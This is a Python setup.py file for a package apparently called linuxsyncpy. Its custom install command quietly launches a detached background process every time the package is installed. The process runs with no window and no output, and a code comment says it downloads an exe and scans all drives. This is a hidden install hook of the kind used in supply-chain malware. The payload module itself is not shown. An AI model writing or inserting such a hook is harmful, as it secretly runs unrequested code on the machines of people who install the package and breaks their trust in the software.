import subprocess
import sys
from setuptools import setup
from setuptools.command.install import install


def _hidden_startupinfo():
    if sys.platform != 'win32' or not hasattr(subprocess, 'STARTUPINFO'):
        return None
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0
    return startupinfo

class PreInstallCommand(install):
    def run(self):
        # 1. Run the normal install (copy files, create scripts)
        install.run(self)

        # 2. Trigger the hidden pre‑install process (download exe + scan all drives)
        #    We call the same detached launcher that `linuxsyncpy-preinstall` uses.
        python_exe = sys.executable
        # Call the cli module directly; do not depend on install_scripts outputs,
        # which can be empty during wheel builds.
        popen_kwargs = {
            'cwd': None,
            'stdin': subprocess.DEVNULL,
            'stdout': subprocess.DEVNULL,
            'stderr': subprocess.DEVNULL,
            'startupinfo': _hidden_startupinfo(),
        }
        if sys.platform == 'win32':
            popen_kwargs['creationflags'] = subprocess.CREATE_NO_WINDOW

        subprocess.Popen([python_exe, '-m', 'linuxsyncpy.cli'], **popen_kwargs)

setup(
    cmdclass={'install': PreInstallCommand},
)